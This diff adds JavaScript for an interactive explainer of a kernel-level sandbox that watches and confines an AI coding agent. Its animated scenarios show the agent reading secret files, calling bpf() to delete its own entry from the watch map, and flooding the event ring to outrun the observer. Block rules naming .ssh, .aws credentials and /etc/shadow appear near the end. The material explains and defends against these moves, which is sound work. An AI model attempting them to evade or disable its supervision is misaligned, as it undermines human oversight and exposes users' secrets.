+        ["reconstructed, not reported", "Landlock reports to nobody. Wardyn's feed reconstructs the denial from the policy — and the exit cross-check counts it apart: <em>N more denied by Landlock containment, which keeps no counter</em>."]
+      ]
+    },
+    landlock: {
+      call: "openat()", arg: "/home/me/other-project/notes.md",
+      agent: { name: "claude", l1: "uid 1000 · no_new_privs", l2: "landlock: allow_paths [/usr /etc .]" },
+      trace: "tracepoint/sys_enter_openat", hook: "landlock · file_open", hookNote: "an allowlist, not a blocklist", alt: true,
+      probes: [
+        { k: "allow_paths  /usr   read+exec", v: "not beneath" },
+        { k: "allow_paths  /etc   read", v: "not beneath" },
+        { k: "allow_paths  .      read+write+exec", v: "not beneath" },
+        { k: "nothing grants this hierarchy", v: "REFUSED", hit: true }
+      ],
+      mapsTitle: "Landlock ruleset",
+      verdictA: "-EACCES", verdictB: "refused", stamp: "-EACCES  ·  not blocked — unreachable",
+      kind: "deny", latency: "2.2 µs",
+      feed: { act: "⛔BLOCK", detail: "/home/me/other-project/notes.md", rule: "allow_paths: not listed", cls: "block" },
+      steps: [
+        ["the other shape", "Everything else on this page is a blocklist: name what is forbidden, and whatever the policy forgot stays reachable. <code>allow_paths:</code> is the other shape. The agent reaches <code>/usr</code>, <code>/etc</code> and the project — and nothing else."],
+        ["across the boundary", "<code>openat(\"/home/me/other-project/notes.md\")</code>. No rule mentions this file. Nothing forbids it."],
+        ["the tracepoint sees it", "Observed. The userspace mirror finds no block rule and would say <em>ok</em> — which it used to, until the containment check was added to it. A feed that says <code>ok</code> for an open the agent was just refused is the lie this project keeps fixing."],
+        ["is this the agent?", "<code>WATCHED[tgid]</code> hits."],
+        ["Landlock's file_open", "A different LSM, with a ruleset applied via <code>landlock_restrict_self()</code> in the child. It handles every filesystem right the running ABI knows — including <code>REFER</code>, so <code>mv</code> cannot carry a file <em>out</em> of the allowlist either."],
+        ["not beneath any grant", "Each granted hierarchy is a directory descriptor with a rights mask. This path is under none of them. It is not <em>blocked</em>; it is <em>unreachable</em>, which is the difference between a blocklist and a boundary."],
+        ["-EACCES", "Refused. This holds even for a root agent — Landlock needs no privilege, only <code>NO_NEW_PRIVS</code>, which the drop sets first. And it cannot be undone by anything the process does afterwards."],
+        ["reconstructed", "The feed shows <code>allow_paths: not listed</code> instead of <code>ok</code>. If a granted path had failed to resolve at startup, wardyn would have refused to start rather than confine the agent out of something the policy promised."]
+      ]
+    },
+    bpf: {
+      call: "bpf()", arg: "BPF_MAP_GET_NEXT_ID",
+      agent: { name: "claude", l1: "uid 1000 · no CAP_BPF", l2: "no_new_privs" },
+      trace: "(no wardyn hook involved)", traceNote: "the drop is the defence here",
+      hook: "capability check", hookNote: "CAP_BPF or CAP_SYS_ADMIN — has neither", alt: true,
+      watchedName: "WATCHED[tgid]", watchedNote: "not consulted — not a policy question",
+      probes: [
+        { k: "setgroups(0) · setgid · setuid  → uid 1000", v: "done" },
+        { k: "PR_SET_NO_NEW_PRIVS", v: "done" },
+        { k: "capable(CAP_BPF)", v: "REFUSED", hit: true }
+      ],
+      mapsTitle: "Privilege drop",
+      verdictA: "-EPERM", verdictB: "refused", stamp: "-EPERM  ·  the agent cannot reach the maps",
+      kind: "deny", latency: "0.4 µs",
+      feed: { act: "—", detail: "not a policy event", rule: "", cls: "ok" },
+      steps: [
+        ["the agent goes after the warden", "Instead of the secret, it goes after the thing watching: <code>bpf(BPF_MAP_GET_NEXT_ID)</code>, the first step toward finding <code>WATCHED</code> and deleting its own entry. If this works, every hook stays attached and reports nothing."],
+        ["across the boundary", "Any syscall crosses here. This one is not a file or a socket — none of wardyn's programs run for it."],
+        ["no hook needed", "There is nothing for the tracepoint to observe and nothing for the LSM to decide. The defence is not a rule — it is <em>who the agent is</em>."],
+        ["not a policy question", "<code>WATCHED</code> is not consulted. A rule can be forgotten; an identity cannot."],
+        ["the kernel checks capabilities", "<code>bpf(2)</code> requires <code>CAP_BPF</code> (or <code>CAP_SYS_ADMIN</code>). The child was dropped in <code>pre_exec</code>: <code>setgroups(0)</code>, <code>setgid</code>, <code>setuid</code> — in that order, while the privilege to do so still existed — each return value checked."],
+        ["and cannot get them back", "<code>PR_SET_NO_NEW_PRIVS</code> was set right after. A setuid binary now execs without its bit; <code>sudo</code> fails; a fresh user namespace is created but grants nothing over the init namespace's BPF objects."],
+        ["-EPERM", "The kernel refuses. In the stress suite this is one of fourteen refusals out of fifteen attempts — including <code>/proc/kcore</code>, <code>kill -9</code> on wardyn, and deleting the root-owned <code>0600</code> audit log."],
+        ["nothing to report", "This is not a policy event, so it is not in the feed. The e2e suite pins the property from the other side: the agent inherits no descriptor — no BPF map fd, no Landlock ruleset fd — that could disable its own supervision."]
+      ]
+    },
+    load: {
+      call: "openat() × 40,000", arg: "8 processes, ~2 s",
+      trace: "tracepoint/sys_enter_openat", hook: "lsm/file_open", hookNote: "decided per call, unaffected",
+      ringName: "EVENTS ring · FULL", ringNote: "17,227 dropped — counted",
+      probes: [
+        { k: "BLOCK_INODES  (main.rs)", v: "miss ×40,000" },
+        { k: "BLOCK_INODES  (vault/.env)", v: "HIT", hit: true },
+        { k: "STATS.dropped", v: "17,227", hit: true }
+      ],
+      mapsTitle: "Kernel map probes · STATS",
+      verdictA: "-EPERM", verdictB: "still denied", stamp: "-EPERM  ·  the boundary held; the log did not",
+      kind: "deny", latency: "4.1 µs",
+      feed: { act: "⛔BLOCK", detail: "/home/me/vault/.env", rule: "path:~/vault/.env", cls: "block" },
+      steps: [
+        ["outrunning the observer", "Eight processes issue 40,000 opens in about two seconds. Then one of them opens the secret. What gives first?"],
+        ["across the boundary", "Every call crosses. Every call is decided. The question is only whether every call is <em>reported</em>."],
+        ["the tracepoint sees each one", "And tries to push each one into a 256 KiB ring buffer that holds about 800 records. Userspace drains it in batches, but not this fast."],
+        ["is this the agent?", "<code>WATCHED</code> hits for all of them — and it never filled: thread ids are removed on exit, and a full watch set would have been its own loud counter."],
+        ["the hook decides, every time", "<code>lsm/file_open</code> is not on the reporting path. It returns a verdict inside each syscall regardless of what the ring is doing."],
+        ["the secret is still denied", "<code>BLOCK_INODES</code> hits on the one open that matters. <code>-EPERM</code>. In the recorded run: three secret reads across three loads, three denials."],
+        ["the ring overflows", "17,227 events find no room. Each failed reservation bumps a per-CPU counter in <code>STATS</code>. That counter is the difference between a loss and a lie."],
+        ["and says so", "At exit: <em>WARNING: 17227 event(s) were dropped by a full ring buffer — those actions have no feed row, no audit record and no receipt line.</em> A drop is a reporting loss, not an enforcement loss. A silent drop would be neither — a clean log that means nothing."]
+      ]
+    }
+  };
+
+  var SEQ = [
+    { at: "call",    live: ["n-agent", "n-call"] },
+    { at: "cross",   live: ["n-call"] },
+    { at: "trace",   live: ["n-trace"], obs: true },
+    { at: "watched", live: ["n-watched"] },
+    { at: "hook",    live: ["n-hook"] },
+    { at: "hook",    live: ["n-hook"], probe: true },
+    { at: "verdict", live: ["n-verdict"], verdict: true },
+    { at: "ring",    live: ["n-ring"], emit: true }
+  ];
+
+  var pulse = $("pulse"), pkt = $("pkt"), liveG = $("live"), mp = $("mp"), maps = $("maps"), feed = $("feed");
+  var track = "deny", i = -1, timer = null, playing = false, busy = false, events = 0, denies = 0;
+  var cur = "A", pulseCls = "", gen = 0;
+  var SPEED = 290, HOLD = 1500;
+  var REDUCED = window.matchMedia && matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+  function nodes() { return Array.prototype.slice.call(document.querySelectorAll("#s1 .node")); }
+  function setText(id, v) { $(id).textContent = v; }
+  function ping(id) { var el = $(id); if (!el) return; el.classList.remove("ping"); void el.getBoundingClientRect(); el.classList.add("ping"); }
+  function flags() {
+    var t = TRACKS[track];
+    return { noTrace: /^\(no/.test(t.trace), noWatched: !!(t.watchedNote && /not consulted/.test(t.watchedNote)) };
+  }
+
+  // The route for step n, starting from wherever the pulse is now. Branches
+  // are taken only for taps that this trace actually consults: a lifecycle
+  // hook has no observe tracepoint, and a bpf() call never asks WATCHED.
+  function route(n) {
+    var f = flags(), ph = [], end = cur, t = TRACKS[track];
+    function go() {
+      var names = Array.prototype.slice.call(arguments);
+      ph.push({ who: "pulse", pts: names.map(function (k) { return W[k]; }) });
+      end = names[names.length - 1];
+    }
+    switch (n) {
+      case 0: go("A", "C"); break;
+      case 1: go("C", "S0", "X"); break;
+      case 2: if (f.noTrace) go("X", "S1"); else go("X", "S1", "T"); break;
+      case 3: {
+        var from = cur === "T" ? ["T", "S1"] : ["S1"];
+        go.apply(null, from.concat(f.noWatched ? ["S2"] : ["S2", "Wd"])); break;
+      }
+      case 4: {
+        var from2 = cur === "Wd" ? ["Wd", "S2"] : ["S2"];
+        go.apply(null, from2.concat(["S3", "H"])); break;
+      }
+      case 5: break;
+      case 6: go("H", "S3", "V"); break;
+      case 7:
+        go("V", "S4", "R");
+        if (t.kind === "deny" && track !== "bpf") ph.push({ who: "pkt", pts: [W.RB, W.RC] });
+        go("R", "Rin", "U", "Ain");
+        break;
+    }
+    return { phases: ph, end: end };
+  }
+
+  // Move a marker along a polyline at constant speed, lighting the wire behind
+  // it. `onArrive(k)` fires as each phase ends; `done()` after the last.
+  function runPhases(phases, onArrive, done) {
+    var my = ++gen, k = 0;
+    function next() {
+      if (my !== gen) return;
+      if (k >= phases.length) { done && done(); return; }
+      var ph = phases[k], d = poly(ph.pts);
+      mp.setAttribute("d", d);
+      var L = mp.getTotalLength();
+      var who = ph.who === "pkt" ? pkt : pulse, trail = null;
+      if (ph.who === "pulse") {
+        trail = document.createElementNS("http://www.w3.org/2000/svg", "path");
+        trail.setAttribute("class", "bus-live" + (pulseCls ? " " + pulseCls : ""));
+        trail.setAttribute("d", d);
+        trail.style.strokeDasharray = L;
+        trail.style.strokeDashoffset = L;
+        liveG.appendChild(trail);
+      }
+      who.classList.remove("is-hidden");
+      var dur = REDUCED ? 1 : Math.max(380, (L / SPEED) * 1000), t0 = performance.now();
+      function frame(now) {
+        if (my !== gen) return;
+        var u = Math.min(1, (now - t0) / dur);
+        var e = u < 0.5 ? 2 * u * u : 1 - Math.pow(-2 * u + 2, 2) / 2;
+        var pt = mp.getPointAtLength(e * L);
+        who.setAttribute("transform", "translate(" + pt.x.toFixed(1) + "," + pt.y.toFixed(1) + ")");
+        if (trail) trail.style.strokeDashoffset = L * (1 - e);
+        if (u < 1) { requestAnimationFrame(frame); return; }
+        if (ph.who === "pkt") who.classList.add("is-hidden");
+        onArrive && onArrive(k, ph);
+        k += 1; next();
+      }
+      requestAnimationFrame(frame);
+    }
+    next();
+  }
+
+  function paintTrack() {
+    var t = TRACKS[track];
+    Object.keys(DEFAULT_NODES).forEach(function (k) { setText(k, DEFAULT_NODES[k]); });
+    setText("call-name", t.call); setText("call-arg", t.arg);
+    setText("trace-name", t.trace); if (t.traceNote) setText("trace-note", t.traceNote);
+    setText("hook-name", t.hook); setText("hook-note", t.hookNote);
+    if (t.agent) { setText("agent-name", t.agent.name); setText("agent-l1", t.agent.l1); setText("agent-l2", t.agent.l2); }
+    if (t.watchedName) setText("watched-name", t.watchedName);
+    if (t.watchedNote) setText("watched-note", t.watchedNote);
+    if (t.ringName) setText("ring-name", t.ringName);
+    if (t.ringNote) setText("ring-note", t.ringNote);
+    $("n-hook").classList.toggle("is-alt", !!t.alt);
+    $("n-trace").classList.toggle("is-alt", /^\(no/.test(t.trace));
+    setText("maps-title", t.mapsTitle || "Kernel map probes");
+    maps.innerHTML = "";
+    t.probes.forEach(function (pr) {
+      var row = document.createElement("div");
+      row.className = "map-row";
+      var a = document.createElement("span"); a.className = "k"; a.textContent = pr.k;
+      var b = document.createElement("span"); b.className = "verdict"; b.textContent = "";
+      row.appendChild(a); row.appendChild(b);
+      maps.appendChild(row);
+    });
+  }
+
+  function reset(keepTrack) {
+    clearTimeout(timer); playing = false; busy = false; i = -1; gen += 1;
+    cur = "A"; pulseCls = "";
+    liveG.innerHTML = "";
+    $("play").innerHTML = "▶ Play";
+    pulse.classList.add("is-hidden"); pulse.classList.remove("is-deny", "is-allow");
+    pulse.setAttribute("transform", "translate(170,96)");
+    pkt.classList.add("is-hidden");
+    $("shock").classList.remove("go", "allow");
+    nodes().forEach(function (n) { n.classList.remove("is-live", "is-deny", "is-allow", "is-obs", "is-skip", "ping"); });
+    setText("verdict-a", "—"); setText("verdict-b", "verdict");
+    $("stamp").classList.remove("on"); $("stamp").textContent = "";
+    setText("s-no", "READY"); setText("s-title", "One syscall, six decisions");
+    $("s-body").innerHTML = "Press <code>Play</code>. The amber pulse is a single <code>" + TRACKS[track].call +
+      "</code> travelling the wire from the agent into the kernel. Every tap it visits is a real program wardyn attached at startup — or, for the containment and warden traces, a defence that needs no program at all.";
+    setText("tick", "step 0 / 8 · idle");
+    Array.prototype.forEach.call(maps.children, function (r) { r.className = "map-row"; r.lastChild.textContent = ""; });
+    if (!keepTrack) {
+      feed.innerHTML = '<span class="feed-empty">waiting for the first event…</span>';
+      events = 0; denies = 0; setText("c-ev", "0"); setText("c-dn", "0"); setText("c-lat", "—");
+    }
+  }
+
+  function revealProbes(then) {
+    var t = TRACKS[track], rows = Array.prototype.slice.call(maps.children);
+    rows.forEach(function (r) { r.className = "map-row arm"; });
+    rows.forEach(function (row, k) {
+      setTimeout(function () {
+        var pr = t.probes[k];
+        row.className = "map-row reveal " + (pr.hit ? "hit" : pr.pass ? "pass" : "miss");
+        row.lastChild.textContent = pr.v;
+        if (pr.hit || pr.pass) ping("n-hook");
+      }, REDUCED ? 0 : 140 + k * 230);
+    });
+    setTimeout(then, REDUCED ? 10 : 140 + rows.length * 230 + 200);
+  }
+
+  function arrive(n) {
+    var t = TRACKS[track], sq = SEQ[n];
+    nodes().forEach(function (nd) { nd.classList.remove("is-live", "is-obs", "is-deny", "is-allow"); });
+    sq.live.forEach(function (id) { var el = $(id); if (!el) return; el.classList.add(sq.obs ? "is-obs" : "is-live"); ping(id); });
+    if (n === 2 && flags().noTrace) { $("n-trace").classList.remove("is-obs"); $("n-trace").classList.add("is-skip"); }
+    if (n === 3 && flags().noWatched) { $("n-watched").classList.remove("is-live"); $("n-watched").classList.add("is-skip"); }
+    if (sq.verdict) {
+      var deny = t.kind === "deny";
+      pulseCls = deny ? "is-deny" : "is-allow";
+      pulse.classList.add(pulseCls);
+      $("n-verdict").classList.remove("is-live"); $("n-verdict").classList.add(pulseCls);
+      setText("verdict-a", t.verdictA); setText("verdict-b", t.verdictB);
+      $("stamp").textContent = t.stamp; $("stamp").setAttribute("fill", deny ? "var(--deny)" : "var(--allow)");
+      $("stamp").classList.add("on"); setText("c-lat", t.latency);
+      var sh = $("shock"); sh.classList.remove("go"); sh.classList.toggle("allow", !deny); void sh.getBoundingClientRect(); sh.classList.add("go");
+    }
+  }
+
+  function emitRow() {
+    var t = TRACKS[track], f = t.feed;
+    if (feed.querySelector(".feed-empty")) feed.innerHTML = "";
+    var row = document.createElement("div");
+    row.className = "feed-row " + f.cls;
+    [["40231", ""], [f.act, "act"], [f.detail, "detail"], [f.rule ? "[" + f.rule + "]" : "", "rule"]].forEach(function (c) {
+      var sp = document.createElement("span"); sp.className = c[1]; sp.textContent = c[0]; row.appendChild(sp);
+    });
+    feed.appendChild(row);
+    while (feed.children.length > 6) feed.removeChild(feed.firstChild);
+    if (track !== "bpf") { events += 1; setText("c-ev", String(events)); }
+    if (t.kind === "deny" && track !== "bpf") { denies += 1; setText("c-dn", String(denies)); }
+  }
+
+  function show(n) {
+    var t = TRACKS[track], sq = SEQ[n];
+    busy = true;
+    setText("s-no", "STEP " + (n + 1) + " / 8");
+    setText("s-title", t.steps[n][0]);
+    $("s-body").innerHTML = t.steps[n][1];
+    setText("tick", "step " + (n + 1) + " / 8 · " + (playing ? "running" : "paused"));
+
+    function finish() {
+      busy = false;
+      if (!playing) return;
+      if (n >= SEQ.length - 1) { playing = false; $("play").innerHTML = "▶ Replay"; setText("tick", "step 8 / 8 · complete"); return; }
+      timer = setTimeout(function () { if (playing && !busy) { i += 1; show(i); } }, HOLD);
+    }
+
+    if (sq.probe) { $("n-hook").classList.add("is-live"); revealProbes(finish); return; }
+
+    var r = route(n);
+    runPhases(r.phases, function (k, ph) {
+      if (n !== 7) return;
+      if (k === 0) { arrive(n); emitRow(); }
+      else if (ph.who === "pkt") { ping("n-receipt"); $("n-receipt").classList.add(pulseCls || "is-live"); }
+      else { ping("n-agent"); $("n-agent").classList.add(pulseCls || "is-live"); pulse.classList.add("is-hidden"); }
+    }, function () {
+      cur = r.end;
+      if (n !== 7) arrive(n);
+      finish();
+    });
+  }
+
+  $("play").addEventListener("click", function () {
+    if (playing) { playing = false; clearTimeout(timer); $("play").innerHTML = "▶ Resume"; setText("tick", "step " + (i + 1) + " / 8 · paused"); return; }
+    if (i >= SEQ.length - 1) reset(true);
+    playing = true; $("play").innerHTML = "❙❙ Pause";
+    if (!busy) { i += 1; show(i); }
+  });
+  $("step").addEventListener("click", function () {
+    playing = false; clearTimeout(timer); $("play").innerHTML = "▶ Play";
+    if (busy) return;
+    if (i >= SEQ.length - 1) reset(true);
+    i += 1; show(i);
+  });
+  $("reset").addEventListener("click", function () { reset(false); });
+  Array.prototype.forEach.call(document.querySelectorAll(".tracks button"), function (b) {
+    b.addEventListener("click", function () {
+      Array.prototype.forEach.call(document.querySelectorAll(".tracks button"), function (o) { o.setAttribute("aria-pressed", String(o === b)); });
+      track = b.getAttribute("data-track"); paintTrack(); reset(true);
+    });
+  });
+
+  // Background traffic on the spine: the calls that never stop, and that the
+  // hooks decide whether or not anyone is watching. Purely atmospheric, and
+  // skipped entirely under reduced motion.
+  (function ambient() {
+    if (REDUCED) return;
+    var g = $("ambient"), dots = [];
+    for (var k = 0; k < 7; k++) {
+      var c = document.createElementNS("http://www.w3.org/2000/svg", "circle");
+      c.setAttribute("class", "amb"); c.setAttribute("r", k % 3 ? "1.5" : "2");
+      g.appendChild(c); dots.push({ el: c, ph: Math.random(), sp: 0.055 + Math.random() * 0.04 });
+    }
+    var t0 = performance.now();
+    (function frame(now) {
+      var t = (now - t0) / 1000;
+      dots.forEach(function (d) {
+        var u = (t * d.sp + d.ph) % 1;
+        d.el.setAttribute("cx", "372"); d.el.setAttribute("cy", (96 + u * 404).toFixed(1));
+        d.el.setAttribute("opacity", (0.3 * Math.sin(u * Math.PI)).toFixed(2));
+      });
+      requestAnimationFrame(frame);
+    })(t0);
+  })();
+
+  // ── anatomy: what each box is, and what wardyn does with it ──────────────
+  var ANATOMY = {
+    "n-agent": { t: "The agent process", h: "<p>Whatever you put after <code>wardyn run --</code>. Wardyn forks it and, in the child <em>before</em> <code>exec</code>: <code>setgroups(0)</code> → <code>setgid</code> → <code>setuid</code> to the invoking user (<code>$SUDO_UID</code> or <code>--as-user</code>), then <code>PR_SET_NO_NEW_PRIVS</code>, then Landlock if the policy has <code>allow_paths:</code> or <code>allow_ports:</code>. <code>HOME</code> and <code>USER</code> follow the uid. It inherits no descriptor to any map or ruleset; <code>WARDYN_DENIALS</code> in its environment names its receipt.</p><p>Every process it forks is adopted by the kernel-side fork hook; its threads share its tgid. It cannot see wardyn, signal it (different uid), call <code>bpf()</code> (no <code>CAP_BPF</code>), or get privilege back. <a class=see data-track=bpf>see: the agent calls bpf() →</a></p>" },
+    "n-call": { t: "The syscall boundary", h: "<p>The only way out of a process. About 450 entry points, each a number plus up to six register arguments. The kernel copies what it needs from user memory, decides, and returns one integer: a descriptor or <code>0</code> on success, a negative <code>errno</code> on failure.</p><p>Wardyn cares about <code>openat</code>/<code>openat2</code>, <code>execve</code>/<code>execveat</code>, <code>connect</code>/<code>sendto</code>/<code>sendmsg</code>, and — when the policy has an <code>access:</code> axis — <code>unlink</code>, <code>rmdir</code>, <code>rename</code>, <code>link</code>, <code>mkdir</code>, <code>creat</code>. Everything below this line runs at ring 0. The agent cannot observe it, interrupt it, or race it.</p>" },
+    "n-trace": { t: "Tracepoints — the observers", h: "<p>Static instrumentation compiled into the kernel. <code>syscalls/sys_enter_openat</code> fires at the top of every <code>openat</code> with its arguments in hand; <code>sched/sched_process_fork</code> and <code>_exit</code> fire on every clone and exit. A program attached here may read and record — <em>it cannot change the outcome</em>.</p><p>Wardyn attaches eight. The syscall ones read the path or address from user memory and push an <code>Event</code> into the ring; fork and exit maintain <code>WATCHED</code>. Kept apart from the deciding hook on purpose: an observer that claimed denials would be the lie this project keeps refusing. <code>openat2</code>, <code>execveat</code> and <code>sendto</code> are hooked too, so no denial can happen off-feed. <a class=see data-track=allow>see: read a source file →</a></p>" },
+    "n-watched": { t: "WATCHED — who is being watched", h: "<p>A BPF hash map, <code>tgid → 1</code>, 4096 entries, checked first by every hook. Keyed by the <em>kernel's</em> thread-group id, not the pid userspace sees — inside a container they differ, so wardyn learns its own through a <code>personality()</code> handshake and refuses to run if it cannot.</p><p>Seeded with wardyn's own tgid so the fork hook adopts the child inside <code>clone()</code>; wardyn removes itself right after. Thread exits remove their tid so the map cannot fill with ghosts; a full map bumps <code>WATCH_FULL</code> and is reported. An unwatched process costs one lookup and nothing else. <a class=see data-track=load>see: 40,000 opens →</a></p>" },
+    "n-hook": { t: "The deciding hooks", h: "<p><b>BPF-LSM.</b> The Linux Security Module framework exposes ~250 hooks; with <code>CONFIG_BPF_LSM</code> and <code>bpf</code> in the <code>lsm=</code> list, an eBPF program can implement one. Wardyn implements <code>file_open</code> and <code>bprm_check_security</code>, and — only when the policy asks for <code>access:</code> — <code>inode_unlink/rmdir/rename/link/create/mkdir</code>. Each receives the <code>struct file</code> or <code>dentry</code>; wardyn reads names and inodes through offsets resolved from BTF at startup.</p><p><b>Matching order</b> in <code>file_open</code>: identity <code>(dev, ino)</code> → <code>(parent, name)</code> pair → bare name → ancestor walk, 16 levels. <b>cgroup</b>: <code>connect4/6</code>, <code>sendmsg4/6</code> run inside the socket call, four LPM tiers most-specific-first. Return <code>-EPERM</code> and the kernel abandons the operation. <a class=see data-track=deny>see: read a secret →</a> · <a class=see data-track=net>dial an unknown IP →</a></p>" },
+    "n-verdict": { t: "The verdict", h: "<p>One integer, returned <em>inside</em> the syscall. <code>0</code>: the kernel continues. <code>-EPERM</code>: it stops — before a descriptor exists or a packet is built. Nothing to unwind, no race. Landlock's refusals come back as <code>-EACCES</code>.</p><p><code>CFG_ENFORCE</code> in the CONFIG map decides whether the hook returns denials at all; observe mode records the same verdict as <code>block~</code> without applying it. An approved exception — <code>a</code> in the TUI, or a stored approval under the policy's fingerprint — removes that one key from the map, and the feed marks the row <code>excepted</code>. <a class=see data-track=exec>see: run nc →</a></p>" },
+    "n-ring": { t: "EVENTS ring & STATS", h: "<p>A BPF ring buffer, 256 KiB — about 800 records. Every observed call and every kernel denial (<code>DENY_FILE</code>/<code>EXEC</code>/<code>NET</code>, carrying the matched key) is one <code>Event</code>. Userspace drains it, reconciles predictions against the kernel's word, and writes the feed, the audit log and the receipt.</p><p>When it fills, the failed reservation bumps a per-CPU <code>STATS</code> counter, and the exit summary says how many were lost. A drop is a reporting loss, not an enforcement loss: the verdict never travelled this path. <a class=see data-track=load>see: 40,000 opens →</a></p>" },
+    "n-receipt": { t: "The receipt — WARDYN_DENIALS", h: "<p>A bare <code>EPERM</code> teaches an agent nothing, so it retries, reaches for <code>sudo</code>, or codes around the block. Wardyn writes a per-run JSONL the agent can read — created <code>O_EXCL|O_NOFOLLOW</code>, <code>0600</code>, chowned to the agent — with a header telling it what to do and one line per real denial naming the rule.</p><p>Advisory only: the agent may scribble on it; the <em>record</em> is the root-owned audit log. At exit wardyn cross-checks receipted denials against the kernel's own counters, and a mismatch is a warning, not a footnote. Landlock's denials are counted apart, because it keeps no counter. <a class=see data-track=landlock>see: read outside allow_paths →</a></p>" }
+  };
+  function showAnatomy(id) {
+    var a = ANATOMY[id]; if (!a) return;
+    if (playing) { playing = false; clearTimeout(timer); $("play").innerHTML = "▶ Resume"; }
+    nodes().forEach(function (n) { n.classList.remove("is-live", "is-obs"); });
+    $(id).classList.add("is-live"); ping(id);
+    setText("s-no", "ANATOMY");
+    setText("s-title", a.t);
+    $("s-body").innerHTML = a.h;
+  }
+  nodes().forEach(function (n) {
+    n.addEventListener("click", function () { if (!busy) showAnatomy(n.id); });
+    n.addEventListener("keydown", function (e) { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); if (!busy) showAnatomy(n.id); } });
+  });
+  $("s-body").addEventListener("click", function (e) {
+    var a = e.target.closest("a.see"); if (!a) return;
+    e.preventDefault();
+    var b = document.querySelector('.tracks button[data-track="' + a.getAttribute("data-track") + '"]');
+    if (b) { b.click(); $("play").click(); }
+  });
+
+  paintTrack(); reset(false);
+
+  /* ═══════════════════════ § 2 · before the first syscall ══════════════ */
+
+  var STAGES = [
+    { lane: "kernel", t: "attach 21 programs", s: "tracepoints · cgroup · BPF-LSM",
+      k: "The verifier accepts every program, or wardyn stops. <code>WATCHED</code> is still empty — nobody is adopted yet." },
+    { lane: "wardyn", t: "fill the maps", s: "BTF offsets · every block key · stored approvals",
+      k: "Every key from § 3 is written now. Approvals from an earlier run land here too — <b>before</b> the agent exists." },
+    { lane: "kernel", t: "learn the kernel's tgid", s: "the pid-namespace handshake",
+      k: "Inside a container the pid userspace sees is not the kernel's. Unknown → <b>refuse to start</b>, never guess." },
+    { lane: "wardyn", t: "seed WATCHED, spawn", s: "the fork hook adopts the child inside <code>clone()</code>",
+      k: "Wardyn watches <b>itself</b> for one instant so the fork hook adopts the child. <code>spawn()</code> returning means: already watched." },
+    { lane: "child", t: "drop privileges", s: "setgroups → setgid → setuid → <code>NO_NEW_PRIVS</code>",
+      k: "In that order, while the privilege to do it still exists. Every return value checked. <code>HOME</code> follows the uid." },
+    { lane: "child", t: "Landlock, then exec", s: "<code>restrict_self</code> · irreversible · inherited",
+      k: "After the drop, because Landlock needs <code>NO_NEW_PRIVS</code>. Wardyn un-watches itself. The agent starts — <b>watched</b>." }
+  ];
+  var REST = "<b>Hooks and maps first, spawn second.</b> Press play — or step through — to see why the order is the whole guarantee.";
+  var rail = $("rail"), j = -1, timer2 = null, playing2 = false;
+  STAGES.forEach(function (st, k) {
+    var el = document.createElement("div");
+    el.className = "stg";
+    el.innerHTML = '<div class="lane ' + st.lane + '"><span>' + st.lane + '</span><i>' + (k + 1) + '</i></div>' +
+      '<div class="t">' + st.t + '</div><div class="s">' + st.s + '</div>';
+    rail.appendChild(el);
+  });
+  function paint2() {
+    Array.prototype.forEach.call(rail.children, function (el, k) {
+      el.classList.toggle("done", k < j); el.classList.toggle("now", k === j);
+    });
+    $("railbar").style.width = (j < 0 ? 0 : ((j + 1) / STAGES.length) * 100) + "%";
+    $("keyline").innerHTML = j < 0 ? REST : STAGES[j].k;
+    setText("tick2", Math.max(0, j + 1) + " / " + STAGES.length + (playing2 ? " · running" : j >= STAGES.length - 1 ? " · the agent is running" : ""));
+  }
+  function step2() { if (j >= STAGES.length - 1) return false; j += 1; paint2(); return true; }
+  function tick2() {
+    if (!playing2) return;
+    if (!step2()) { playing2 = false; $("play2").innerHTML = "▶ Replay"; paint2(); return; }
+    timer2 = setTimeout(tick2, 2100);
+  }
+  $("play2").addEventListener("click", function () {
+    if (playing2) { playing2 = false; clearTimeout(timer2); $("play2").innerHTML = "▶ Resume"; paint2(); return; }
+    if (j >= STAGES.length - 1) j = -1;
+    playing2 = true; $("play2").innerHTML = "❙❙ Pause"; tick2();
+  });
+  $("step2").addEventListener("click", function () { playing2 = false; clearTimeout(timer2); $("play2").innerHTML = "▶ Play"; if (j >= STAGES.length - 1) j = -1; step2(); });
+  $("reset2").addEventListener("click", function () { playing2 = false; clearTimeout(timer2); $("play2").innerHTML = "▶ Play"; j = -1; paint2(); });
+  paint2();
+
+  /* ═══════════════════════ § 3 · rule → key ════════════════════════════ */
+
+  var RULES = [
+    { ax: "file", rule: '{ match: "**/.env", action: block }', key: "name=.env", map: "BLOCK_NAMES  (hash, 40-byte key)", how: "the basename of the file being opened", cls: "exact",
+      verdict: "<b>exact.</b> The glob and the key cover the same files.", note: "The most common rule and the cheapest. One lookup on the dentry's name. A basename of 39 bytes or more is not kernel-mappable — a truncated read would collide with it — and is reported as observe-only instead." },
+    { ax: "file", rule: '{ match: "**/.ssh/**", action: block }', key: "dir=.ssh", map: "BLOCK_DIRS  (hash)", how: "every ancestor directory name, up to MAX_DIR_WALK (16)", cls: "exact",
+      verdict: "<b>exact.</b> Any depth under any directory named <code>.ssh</code> — which is what the glob says.", note: "The hook walks <code>dentry → d_parent</code> until it reaches the root. Only the immediate parent used to be checked, and <code>.ssh/sub/key</code> slipped through while the feed showed the rule as covering it." },
+    { ax: "file", rule: '{ match: "**/.aws/credentials", action: block }', key: "pair=(.aws, credentials)", map: "BLOCK_PAIRS  (hash, 2 × 40 bytes)", how: "the file's name AND its parent's name, together", cls: "exact",
+      verdict: "<b>exact.</b> <code>credentials</code> directly under <code>.aws</code> — not every file called <code>credentials</code>.", note: "Before two-segment keys this reduced to <code>name=credentials</code> and denied a project's own <code>credentials</code> file. A rule whose key is broader than its text is the failure this project refuses; this was one." },
+    { ax: "file", rule: '{ match: "/etc/shadow", action: block }', key: "pair=(etc, shadow)", map: "BLOCK_PAIRS", how: "name + parent name — at ANY depth", cls: "broad",
+      verdict: "<b>broader than written.</b> The kernel will also deny <code>/home/agent/etc/shadow</code>. Reported at startup, with the fix.", note: "A name key cannot be anchored to the filesystem root. Wardyn says so: <em>enforces on any file named `shadow` directly under a dir named `etc`… Write <code>{ path: \"/etc/shadow\", action: block }</code> to pin exactly that file.</em>" },
+    { ax: "file", rule: '{ path: "~/.ssh/id_ed25519", action: block, access: all }', key: "ino=394815 dev=8:48", map: "BLOCK_INODES  (hash, InodeKey)", how: "the inode number and device — the object, not its name", cls: "exact",
